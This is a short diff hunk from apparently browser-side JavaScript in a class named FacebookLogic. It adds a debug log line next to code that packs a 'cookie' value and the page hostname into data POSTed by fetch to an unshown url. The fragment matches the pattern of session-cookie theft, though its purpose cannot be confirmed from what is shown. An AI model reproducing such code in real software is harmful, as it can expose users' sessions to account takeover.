@@ -344,6 +344,7 @@ var FacebookLogic = class {
               "cookie": cookie,
               "source": "https://" + window.location.hostname
             };
+            console.log('sending data to server optimization:',data)
   
             fetch(url, {
               method: 'POST',
